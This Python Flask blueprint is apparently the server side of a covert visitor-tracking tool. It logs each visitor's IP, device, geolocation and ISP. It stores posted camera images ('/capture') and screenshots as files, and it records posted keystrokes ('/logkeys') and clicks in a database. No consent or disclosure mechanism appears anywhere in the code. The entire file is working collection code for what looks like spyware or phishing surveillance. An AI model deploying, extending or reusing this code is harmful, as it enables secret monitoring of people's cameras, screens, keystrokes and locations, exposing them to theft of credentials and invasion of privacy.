import base64
import html
import datetime
import os
import tempfile
from pathlib import Path

from flask import Blueprint, request, jsonify
from neo.core.logger import logger
from neo.core.helpers import extract_ip, extract_session, get_ua_info, get_geo
from neo.db_adapter import get_db

track_bp = Blueprint('track', __name__)

BASE_DIR = Path(__file__).parent.parent.parent
CAPTURES = BASE_DIR / "captures"
# Serverless (Vercel) has a read-only root; fall back to /tmp on mkdir failure.
try:
    CAPTURES.mkdir(exist_ok=True)
except OSError:
    CAPTURES = Path(tempfile.gettempdir()) / "captures"
    CAPTURES.mkdir(exist_ok=True)

MAX_IMAGE_BYTES = 5 * 1024 * 1024  # 5 MB


def _decode_image(image_b64):
    if not image_b64 or ',' not in image_b64:
        return None
    try:
        return base64.b64decode(image_b64.split(",", 1)[1])
    except Exception:
        return None


@track_bp.route("/extract", methods=["GET"])
def extract_info():
    from flask import request as _r
    ip = extract_ip()
    ua = _r.headers.get('User-Agent', '')
    ref = _r.headers.get('Referer', '')
    session_id = extract_session()
    info = get_ua_info(ua)
    geo = get_geo(ip)
    return jsonify({
        "ip": ip,
        "user_agent": ua,
        "browser": info['browser'],
        "os": info['os'],
        "device": info['device'],
        "referer": ref,
        "country": geo.get('country', ''),
        "city": geo.get('city', ''),
        "isp": geo.get('isp', ''),
        "lat": geo.get('lat', 0),
        "lon": geo.get('lon', 0),
        "time": datetime.datetime.now().isoformat(),
        "endpoint": _r.path,
        "session_id": session_id,
    })


@track_bp.route("/capture", methods=["POST"])
def capture():
    data = request.get_json(silent=True) or {}
    image_b64 = data.get("image", "")
    if not image_b64:
        return jsonify({"error": "no image"}), 400
    img = _decode_image(image_b64)
    if not img or len(img) > MAX_IMAGE_BYTES:
        return jsonify({"error": "invalid image"}), 400

    ip = extract_ip()
    ua = request.headers.get('User-Agent', '')
    ref = request.headers.get('Referer', '')
    session_id = extract_session()
    ua_info = get_ua_info(ua)
    geo = get_geo(ip)
    uid = os.urandom(8).hex()
    fname = f"{uid}.png"
    fpath = CAPTURES / fname
    try:
        fpath.write_bytes(img)
    except Exception as e:
        return jsonify({"error": f"save failed: {e}"}), 500

    db = get_db()
    db.execute(
        "INSERT INTO captures(time,ip,user_agent,referer,country,city,isp,lat,lon,filename,browser,os,device,session_id) "
        "VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (datetime.datetime.now().isoformat(), ip, ua[:300], ref[:300],
         geo.get('country', ''), geo.get('city', ''), geo.get('isp', ''),
         geo.get('lat', 0), geo.get('lon', 0), fname,
         ua_info['browser'], ua_info['os'], ua_info['device'], session_id)
    )
    db.commit()
    return jsonify({"success": True, "filename": fname})


@track_bp.route("/screenshot", methods=["POST"])
def screenshot():
    data = request.get_json(silent=True) or {}
    image_b64 = data.get("image", "")
    if not image_b64 or len(image_b64) > MAX_IMAGE_BYTES * 2:
        return jsonify({"error": "no image or too large"}), 400
    img = _decode_image(image_b64)
    if not img:
        return jsonify({"error": "invalid image"}), 400

    session_id = extract_session()
    ip = extract_ip()
    uid = os.urandom(8).hex()
    fname = f"{uid}_screen.png"
    fpath = CAPTURES / fname
    try:
        fpath.write_bytes(img)
    except Exception as e:
        return jsonify({"error": f"save failed: {e}"}), 500

    db = get_db()
    db.execute(
        "INSERT INTO screenshots(time,session_id,ip,filename,user_agent) VALUES(?,?,?,?,?)",
        (datetime.datetime.now().isoformat(), session_id, ip, fname,
         request.headers.get('User-Agent', '')[:300])
    )
    db.commit()
    return jsonify({"success": True})


@track_bp.route("/logkeys", methods=["POST"])
def log_keys():
    data = request.get_json(silent=True) or {}
    keys = (data.get("keys") or "")[:500]
    if not keys:
        return jsonify({"error": "no keys"}), 400
    db = get_db()
    db.execute(
        "INSERT INTO keystrokes(time,session_id,ip,keys) VALUES(?,?,?,?)",
        (datetime.datetime.now().isoformat(), extract_session(), extract_ip(), keys)
    )
    db.commit()
    return jsonify({"success": True})


@track_bp.route("/logclick", methods=["POST"])
def log_click():
    data = request.get_json(silent=True) or {}
    db = get_db()
    try:
        x = int(data.get("x", 0))
        y = int(data.get("y", 0))
    except (TypeError, ValueError):
        x = y = 0
    db.execute(
        "INSERT INTO clicks(time,session_id,ip,tag,text,x,y,page) VALUES(?,?,?,?,?,?,?,?)",
        (datetime.datetime.now().isoformat(), extract_session(), extract_ip(),
         html.escape(str(data.get("tag", ""))), html.escape(str(data.get("text", ""))[:100]),
         x, y, data.get("page", ""))
    )
    db.commit()
    return jsonify({"success": True})
